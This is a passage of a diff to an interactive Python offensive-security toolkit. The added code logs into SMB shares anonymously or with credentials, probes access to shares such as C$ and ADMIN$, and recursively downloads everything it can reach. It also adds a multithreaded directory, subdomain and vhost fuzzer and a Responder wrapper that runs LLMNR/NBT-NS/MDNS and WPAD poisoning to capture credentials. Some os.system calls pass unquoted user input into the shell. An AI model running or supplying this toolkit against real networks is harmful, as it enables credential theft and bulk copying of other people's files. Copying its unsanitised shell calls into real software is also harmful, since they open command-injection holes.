+                    backgroundColor: ['#c0392b', '#e74c3c', '#f39c12', '#3498db']
+                }}]
+            }},
+            options: {{
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: {{
+                    legend: {{
+                        display: false
+                    }}
+                }},
+                scales: {{
+                    y: {{
+                        beginAtZero: true,
+                        ticks: {{
+                            stepSize: 1
+                        }}
+                    }}
+                }}
+            }}
+        }});
+        
+        // Services Chart
+        const servicesCtx = document.getElementById('servicesChart').getContext('2d');
+        new Chart(servicesCtx, {{
+            type: 'horizontalBar',
+            data: {{
+                labels: {json.dumps(service_labels)},
+                datasets: [{{
+                    label: 'Count',
+                    data: {json.dumps(service_data)},
+                    backgroundColor: '#3498db'
+                }}]
+            }},
+            options: {{
+                indexAxis: 'y',
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: {{
+                    legend: {{
+                        display: false
+                    }}
+                }},
+                scales: {{
+                    x: {{
+                        beginAtZero: true,
+                        ticks: {{
+                            stepSize: 1
+                        }}
+                    }}
+                }}
+            }}
+        }});
+        
+        // Hosts Overview Chart
+        const hostsCtx = document.getElementById('hostsChart').getContext('2d');
+        new Chart(hostsCtx, {{
+            type: 'pie',
+            data: {{
+                labels: ['Hosts with Vulns', 'Secure Hosts'],
+                datasets: [{{
+                    data: [{sum(1 for r in scan_results if any(p['vulnerabilities'] for p in r['ports']))}, 
+                           {sum(1 for r in scan_results if not any(p['vulnerabilities'] for p in r['ports']))}],
+                    backgroundColor: ['#e74c3c', '#27ae60']
+                }}]
+            }},
+            options: {{
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: {{
+                    legend: {{
+                        position: 'bottom'
+                    }}
+                }}
+            }}
+        }});
+    </script>
+</body>
+</html>
+"""
     
     try:
         with open(filename, 'w') as f:
             f.write(html)
         print_status(f"Report saved: {GREEN}{filename}{RESET}", 'success')
+        
+        # Ask if user wants to open it
+        open_now = input(f"\n{CYAN}Open report in browser? (y/n): {RESET}").lower()
+        if open_now == 'y':
+            try:
+                os.system(f"xdg-open {filename} 2>/dev/null || open {filename} 2>/dev/null")
+                print_status("Opening report in browser...", 'info')
+            except:
+                pass
     except Exception as e:
         print_status(f"Error: {e}", 'error')
     
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
 def smb_enumeration(scan_results):
-    """SMB enumeration"""
+    """SMB enumeration with anonymous and credential-based authentication"""
     print(f"\n{BOLD}{CYAN}╔══════════════════════════════════════════════════════════════╗{RESET}")
     print(f"{BOLD}{CYAN}║           🗂️  SMB ENUMERATION                                ║{RESET}")
     print(f"{BOLD}{CYAN}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
     
+    # Find SMB hosts
     smb_hosts = []
     for result in scan_results:
         for port in result['ports']:
@@ -650,43 +1433,274 @@ def smb_enumeration(scan_results):
         input(f"\n{YELLOW}Press Enter to continue...{RESET}")
         return
     
-    print(f"{YELLOW}SMB Hosts:{RESET}")
+    # Display available SMB hosts
+    print(f"{YELLOW}SMB Hosts Found:{RESET}\n")
     for idx, host in enumerate(smb_hosts, 1):
         print(f"{GREEN}[{idx}]{RESET} {host}")
     
     try:
+        # Select host
         choice = int(input(f"\n{CYAN}Select host (0=cancel): {RESET}"))
         if choice == 0 or choice > len(smb_hosts):
             return
         
         target = smb_hosts[choice - 1]
         
-        print(f"\n{YELLOW}[~] Enumerating {target}...{RESET}\n")
-        os.system(f"smbclient -L //{target} -N")
+        # Authentication method
+        print(f"\n{YELLOW}Authentication Method:{RESET}\n")
+        print(f"{GREEN}[1]{RESET} Anonymous Login")
+        print(f"{GREEN}[2]{RESET} Login with Credentials")
         
-        download = input(f"\n{CYAN}Download shares? (y/n): {RESET}").lower()
+        auth_choice = int(input(f"\n{CYAN}Select option: {RESET}"))
         
-        if download == 'y':
-            share = input(f"{CYAN}Share name (or 'all'): {RESET}")
+        if auth_choice not in [1, 2]:
+            print_status("Invalid option!", 'error')
+            return
+        
+        username = ""
+        password = ""
+        
+        if auth_choice == 1:
+            # Anonymous login
+            print(f"\n{YELLOW}[~] Attempting anonymous login to {target}...{RESET}\n")
+            username = ""
+            password = ""
+        else:
+            # Credential-based login
+            print(f"\n{YELLOW}Enter Credentials:{RESET}")
+            username = input(f"{CYAN}Username: {RESET}")
+            import getpass
+            password = getpass.getpass(f"{CYAN}Password: {RESET}")
+            print(f"\n{YELLOW}[~] Attempting login to {target} as '{username}'...{RESET}\n")
+        
+        # List shares and check access
+        try:
+            from impacket.smbconnection import SMBConnection
+            from impacket import smb
+        except ImportError:
+            print_status("impacket not installed! Install: pip3 install impacket", 'error')
+            input(f"\n{YELLOW}Press Enter to continue...{RESET}")
+            return
+        
+        try:
+            # Connect to SMB
+            conn = SMBConnection(target, target, timeout=10)
             
-            if share.lower() == 'all':
-                os.system(f"smbget -R smb://{target}/* -U guest%")
+            if username:
+                conn.login(username, password)
+                print_status(f"Successfully authenticated as '{username}'", 'success')
             else:
-                output_dir = f"smb_{target}_{share}"
-                os.makedirs(output_dir, exist_ok=True)
-                os.system(f"smbget -R smb://{target}/{share} -U guest%")
+                conn.login('', '')
+                print_status("Anonymous login successful!", 'success')
+            
+            # List all shares
+            print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
+            print(f"{BOLD}{CYAN}                    AVAILABLE SHARES{RESET}")
+            print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
+            
+            shares = conn.listShares()
+            accessible_shares = []
+            
+            for share in shares:
+                share_name = share['shi1_netname'][:-1]  # Remove null terminator
+                
+                # Skip special shares
+                if share_name.endswith('$') and share_name not in ['C$', 'ADMIN$', 'IPC$']:
+                    continue
+                
+                # Test access to share
+                try:
+                    conn.listPath(share_name, '/*')
+                    access_status = f"{GREEN}[ACCESSIBLE]{RESET}"
+                    accessible_shares.append(share_name)
+                except:
+                    access_status = f"{RED}[NO ACCESS]{RESET}"
+                
+                share_comment = share['shi1_remark'][:-1] if share['shi1_remark'] else "No description"
+                print(f"  {YELLOW}[Share]{RESET} {CYAN}{share_name:<20}{RESET} {access_status}")
+                print(f"         Comment: {share_comment}\n")
+            
+            if not accessible_shares:
+                print_status("No accessible shares found!", 'warning')
+                conn.logoff()
+                input(f"\n{YELLOW}Press Enter to continue...{RESET}")
+                return
+            
+            print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
+            print_status(f"Found {len(accessible_shares)} accessible share(s)", 'success')
+            
+            # Download options
+            print(f"\n{YELLOW}Download Options:{RESET}\n")
+            print(f"{GREEN}[1]{RESET} Download Everything (all accessible shares)")
+            print(f"{GREEN}[2]{RESET} Download Specific Share")
+            print(f"{GREEN}[0]{RESET} Skip Download")
+            
+            download_choice = int(input(f"\n{CYAN}Select option: {RESET}"))
+            
+            if download_choice == 0:
+                conn.logoff()
+                return
+            
+            # Get output directory
+            default_output = "./"
+            output_dir = input(f"\n{CYAN}Output directory (default: {default_output}): {RESET}").strip()
+            
+            if not output_dir:
+                output_dir = default_output
+            
+            # Create base directory for this target
+            base_dir = os.path.join(output_dir, f"smb_{target}")
+            os.makedirs(base_dir, exist_ok=True)
+            
+            def download_share_contents(conn, share_name, local_path, indent=0):
+                """Recursively download share contents"""
+                try:
+                    files = conn.listPath(share_name, '/*')
+                    
+                    for f in files:
+                        filename = f.get_longname()
+                        
+                        # Skip current and parent directory entries
+                        if filename in ['.', '..']:
+                            continue
+                        
+                        remote_path = f"\\{filename}"
+                        local_file_path = os.path.join(local_path, filename)
+                        
+                        # Check if it's a directory
+                        if f.is_directory():
+                            print(f"{'  '*indent}{BLUE}[DIR]{RESET}  {filename}")
+                            os.makedirs(local_file_path, exist_ok=True)
+                            # Recursively download subdirectory
+                            download_share_contents(conn, share_name, local_file_path, indent + 1)
+                        else:
+                            # Download file
+                            try:
+                                print(f"{'  '*indent}{GREEN}[FILE]{RESET} {filename}")
+                                with open(local_file_path, 'wb') as local_file:
+                                    conn.getFile(share_name, remote_path, local_file.write)
+                            except Exception as e:
+                                print(f"{'  '*indent}{RED}[FAIL]{RESET} {filename} - {e}")
+                
+                except Exception as e:
+                    print_status(f"Error listing path in {share_name}: {e}", 'error')
+            
+            if download_choice == 1:
+                # Download everything
+                print(f"\n{YELLOW}[~] Downloading all accessible shares...{RESET}\n")
+                
+                for share_name in accessible_shares:
+                    print(f"\n{BOLD}{CYAN}[Downloading Share: {share_name}]{RESET}\n")
+                    
+                    share_dir = os.path.join(base_dir, share_name.replace('$', '_'))
+                    os.makedirs(share_dir, exist_ok=True)
+                    
+                    download_share_contents(conn, share_name, share_dir)
+                
+                print(f"\n{BOLD}{GREEN}{'='*70}{RESET}")
+                print(f"{BOLD}{GREEN}                    DOWNLOAD COMPLETE!{RESET}")
+                print(f"{BOLD}{GREEN}{'='*70}{RESET}\n")
+                print_status(f"All files saved to: {GREEN}{base_dir}{RESET}", 'success')
+            
+            elif download_choice == 2:
+                # Download specific share
+                print(f"\n{YELLOW}Accessible Shares:{RESET}\n")
+                for idx, share_name in enumerate(accessible_shares, 1):
+                    print(f"{GREEN}[{idx}]{RESET} {share_name}")
+                
+                share_idx = int(input(f"\n{CYAN}Select share to download: {RESET}"))
+                
+                if share_idx < 1 or share_idx > len(accessible_shares):
+                    print_status("Invalid selection!", 'error')
+                else:
+                    selected_share = accessible_shares[share_idx - 1]
+                    
+                    print(f"\n{YELLOW}[~] Downloading share: {selected_share}...{RESET}\n")
+                    
+                    share_dir = os.path.join(base_dir, selected_share.replace('$', '_'))
+                    os.makedirs(share_dir, exist_ok=True)
+                    
+                    download_share_contents(conn, selected_share, share_dir)
+                    
+                    print(f"\n{BOLD}{GREEN}{'='*70}{RESET}")
+                    print(f"{BOLD}{GREEN}                    DOWNLOAD COMPLETE!{RESET}")
+                    print(f"{BOLD}{GREEN}{'='*70}{RESET}\n")
+                    print_status(f"Files saved to: {GREEN}{share_dir}{RESET}", 'success')
+            
+            conn.logoff()
+        
+        except Exception as e:
+            print_status(f"SMB connection failed: {e}", 'error')
     
+    except ValueError:
+        print_status("Invalid input!", 'error')
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}Operation cancelled{RESET}")
     except Exception as e:
         print_status(f"Error: {e}", 'error')
     
     input(f"\n{YELLOW}Press Enter to continue...{RESET}")
 
+def fuzzer_worker(queue, results, target_ip, protocol, mode, domain=None, baseline_size=None):
+    """Worker thread for web fuzzing"""
+    import requests
+    from threading import Lock
+    
+    # Disable SSL warnings
+    requests.packages.urllib3.disable_warnings()
+    
+    while not queue.empty():
+        try:
+            word = queue.get()
+            
+            if mode == "directory":
+                url = f"{protocol}://{target_ip}/{word}"
+                try:
+                    response = requests.get(url, timeout=3, verify=False, allow_redirects=False)
+                    if 200 <= response.status_code < 400:
+                        status_color = GREEN if response.status_code == 200 else YELLOW
+                        print(f"{status_color}[{response.status_code}]{RESET} {url}")
+                        results.append((url, response.status_code))
+                except:
+                    pass
+                    
+            elif mode == "subdomain":
+                url = f"https://{word}.{domain}"
+                try:
+                    response = requests.get(url, timeout=3, verify=False, allow_redirects=False)
+                    if 200 <= response.status_code < 400:
+                        status_color = GREEN if response.status_code == 200 else YELLOW
+                        print(f"{status_color}[{response.status_code}]{RESET} {url}")
+                        results.append((url, response.status_code))
+                except:
+                    pass
+                    
+            elif mode == "vhost":
+                headers = {"Host": f"{word}.{domain}"}
+                try:
+                    response = requests.get(f"http://{target_ip}", headers=headers, timeout=3, verify=False)
+                    response_size = len(response.content)
+                    if response_size != baseline_size and response.status_code != 404:
+                        print(f"{GREEN}[VHost Found]{RESET} {word}.{domain} {YELLOW}[Size: {response_size}]{RESET}")
+                        results.append((f"{word}.{domain}", response_size))
+                except:
+                    pass
+                    
+            queue.task_done()
+        except:
+            break
+
 def web_application_scan(scan_results):
-    """Web scanning"""
+    """Custom web fuzzing - directory, subdomain, vhost enumeration"""
+    import requests
+    from queue import Queue
+    import threading
+    
     print(f"\n{BOLD}{MAGENTA}╔══════════════════════════════════════════════════════════════╗{RESET}")
-    print(f"{BOLD}{MAGENTA}║           🌐 WEB APPLICATION SCANNING                        ║{RESET}")
+    print(f"{BOLD}{MAGENTA}║           🌐 WEB APPLICATION FUZZING                         ║{RESET}")
     print(f"{BOLD}{MAGENTA}╚══════════════════════════════════════════════════════════════╝{RESET}\n")
     
+    # Find web services
     web_hosts = []
     for result in scan_results:
         for port in result['ports']:
@@ -709,21 +1723,161 @@ def web_application_scan(scan_results):
             return
         
         target = web_hosts[choice - 1]
-        url = f"{target['protocol']}://{target['host']}:{target['port']}"
+        target_ip = target['host']
+        protocol = target['protocol']
         
-        wordlist = input(f"{CYAN}Wordlist path (Enter=default): {RESET}").strip()
-        if not wordlist:
-            wordlist = "/usr/share/wordlists/dirb/common.txt"
+        print(f"\n{YELLOW}Fuzzing Modes:{RESET}")
+        print(f"{GREEN}[1]{RESET} Directory Fuzzing")
+        print(f"{GREEN}[2]{RESET} Subdomain Fuzzing")
+        print(f"{GREEN}[3]{RESET} VHost Fuzzing")
         
-        print(f"\n{YELLOW}[~] Scanning {url}...{RESET}\n")
+        fuzz_mode = int(input(f"\n{CYAN}Select mode: {RESET}"))
         
-        if check_tool('gobuster'):
-            os.system(f"gobuster dir -u {url} -w {wordlist} -t 50")
-        elif check_tool('dirb'):
-            os.system(f"dirb {url} {wordlist}")
+        if fuzz_mode not in [1, 2, 3]:
+            print_status("Invalid mode!", 'error')
+            return
+        
+        print(f"\n{YELLOW}Intensity Levels:{RESET}")
+        print(f"{GREEN}[1]{RESET} LOW    (~1,000 words)")
+        print(f"{GREEN}[2]{RESET} MEDIUM (~20,000 words)")
+        print(f"{GREEN}[3]{RESET} HIGH   (~100,000+ words)")
+        
+        intensity = int(input(f"\n{CYAN}Select intensity: {RESET}"))
+        
+        # Determine wordlist and mode
+        wordlist = None
+        mode = None
+        domain = None
+        baseline_size = None
+        
+        if fuzz_mode == 1:  # Directory Fuzzing
+            mode = "directory"
+            if intensity == 1:
+                wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
+            elif intensity == 2:
+                wordlist = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+            elif intensity == 3:
+                wordlist = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"
+            else:
+                print_status("Invalid intensity!", 'error')
+                return
+                
+        elif fuzz_mode == 2:  # Subdomain Fuzzing
+            mode = "subdomain"
+            domain = input(f"\n{CYAN}Enter domain (e.g., example.com): {RESET}").strip()
+            if not domain:
+                print_status("Domain required!", 'error')
+                return
+            
+            if intensity == 1:
+                wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+            elif intensity == 2:
+                wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
+            elif intensity == 3:
+                wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
+            else:
+                print_status("Invalid intensity!", 'error')
+                return
+                
+        elif fuzz_mode == 3:  # VHost Fuzzing
+            mode = "vhost"
+            domain = input(f"\n{CYAN}Enter domain (e.g., example.com): {RESET}").strip()
+            if not domain:
+                print_status("Domain required!", 'error')
+                return
+            
+            print(f"\n{YELLOW}[~] Getting baseline response...{RESET}")
+            try:
+                baseline = requests.get(f"http://{target_ip}", timeout=5, verify=False)
+                baseline_size = len(baseline.content)
+                print_status(f"Baseline size: {baseline_size} bytes", 'info')
+            except Exception as e:
+                print_status(f"Failed to get baseline: {e}", 'error')
+                return
+            
+            if intensity == 1:
+                wordlist = "/usr/share/seclists/Discovery/Web-Content/common.txt"
+            elif intensity == 2:
+                wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
+            elif intensity == 3:
+                wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
+            else:
+                print_status("Invalid intensity!", 'error')
+                return
+        
+        # Check if wordlist exists
+        if not os.path.exists(wordlist):
+            print_status(f"Wordlist not found: {wordlist}", 'error')
+            
+            # Offer alternative
+            alt_wordlist = input(f"{CYAN}Enter custom wordlist path (or Enter to cancel): {RESET}").strip()
+            if alt_wordlist and os.path.exists(alt_wordlist):
+                wordlist = alt_wordlist
+            else:
+                return
+        
+        # Load wordlist
+        print(f"\n{YELLOW}[~] Loading wordlist: {os.path.basename(wordlist)}{RESET}")
+        queue = Queue()
+        results = []
+        
+        try:
+            with open(wordlist, 'r', errors='ignore') as w:
+                for line in w:
+                    word = line.strip()
+                    if word and not word.startswith('#'):
+                        queue.put(word)
+        except Exception as e:
+            print_status(f"Error reading wordlist: {e}", 'error')
+            return
+        
+        total_words = queue.qsize()
+        print_status(f"Loaded {total_words} words", 'success')
+        print_status(f"Starting fuzzing with 30 threads...", 'scan')
+        print()
+        
+        # Disable SSL warnings
+        requests.packages.urllib3.disable_warnings()
+        
+        # Start worker threads
+        threads = []
+        num_threads = 30
+        
+        for i in range(num_threads):
+            t = threading.Thread(target=fuzzer_worker, args=(queue, results, target_ip, protocol, mode, domain, baseline_size))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        # Wait for completion
+        try:
+            queue.join()
+        except KeyboardInterrupt:
+            print(f"\n\n{YELLOW}[!] Fuzzing interrupted by user{RESET}")
+        
+        # Display summary
+        print(f"\n{BOLD}{CYAN}{'='*70}{RESET}")
+        print(f"{BOLD}{CYAN}                    FUZZING COMPLETE{RESET}")
+        print(f"{BOLD}{CYAN}{'='*70}{RESET}\n")
+        
+        if results:
+            print_status(f"Found {len(results)} results!", 'success')
+            print()
+            
+            if mode in ["directory", "subdomain"]:
+                for url, status in sorted(results, key=lambda x: x[1]):
+                    status_color = GREEN if status == 200 else YELLOW
+                    print(f"  {status_color}[{status}]{RESET} {url}")
+            else:  # vhost
+                for vhost, size in results:
+                    print(f"  {GREEN}[VHost]{RESET} {vhost} {YELLOW}(Size: {size} bytes){RESET}")
         else:
-            print_status("gobuster/dirb not found!", 'error')
+            print_status("No results found", 'warning')
     
+    except ValueError:
+        print_status("Invalid input!", 'error')
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}Fuzzing cancelled{RESET}")
     except Exception as e:
         print_status(f"Error: {e}", 'error')
     
@@ -776,26 +1930,44 @@ def mitm_with_responder():
         input(f"\n{YELLOW}Press Enter to continue...{RESET}")
         return
     
-    print(f"{YELLOW}Interfaces:{RESET}")
-    os.system("ip -br a")
+    print(f"{YELLOW}Network Interfaces:{RESET}")
+    os.system("ip -br a | grep UP")
     
-    interface = input(f"\n{CYAN}Interface (e.g., eth0): {RESET}")
+    interface = input(f"\n{CYAN}Enter interface (e.g., eth0, wlan0): {RESET}")
     
-    print(f"\n{YELLOW}Options:{RESET}")
-    print(f"{GREEN}[1]{RESET} Standard (HTTP, SMB, SQL)")
-    print(f"{GREEN}[2]{RESET} Analyze mode (no poisoning)")
-    print(f"{GREEN}[3]{RESET} Full poisoning")
+    print(f"\n{YELLOW}Responder Modes:{RESET}")
+    print(f"{GREEN}[1]{RESET} Standard Poisoning (HTTP, SMB, SQL, FTP)")
+    print(f"{GREEN}[2]{RESET} Analyze Mode (passive, no poisoning)")
+    print(f"{GREEN}[3]{RESET} WPAD Poisoning (web proxy auto-discovery)")
+    print(f"{GREEN}[4]{RESET} Full LLMNR/NBT-NS/MDNS Poisoning")
     
     try:
         mode = int(input(f"\n{CYAN}Select mode: {RESET}"))
         
+        print(f"\n{RED}[!] Starting Responder...{RESET}")
+        print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")
+        time.sleep(2)
+        
         if mode == 1:
-            print(f"\n{RED}[!] Starting Responder...{RESET}\n")
-            os.system(f"sudo responder -I {interface}")
+            # Standard mode
+            os.system(f"sudo responder -I {interface} -w")
         elif mode == 2:
+            # Analyze mode only
             os.system(f"sudo responder -I {interface} -A")
         elif mode == 3:
-            os.system(f"sudo responder -I {interface} -wrf")
+            # WPAD poisoning
+            os.system(f"sudo responder -I {interface} -w -F")
+        elif mode == 4:
+            # Full poisoning
+            os.system(f"sudo responder -I {interface} -w -d -F")
+        else:
+            print_status("Invalid mode!", 'error')
+            return
+            
+    except ValueError:
+        print_status("Invalid input!", 'error')
+    except KeyboardInterrupt:
+        print(f"\n\n{YELLOW}[!] Responder stopped{RESET}")
     except Exception as e:
         print_status(f"Error: {e}", 'error')
     
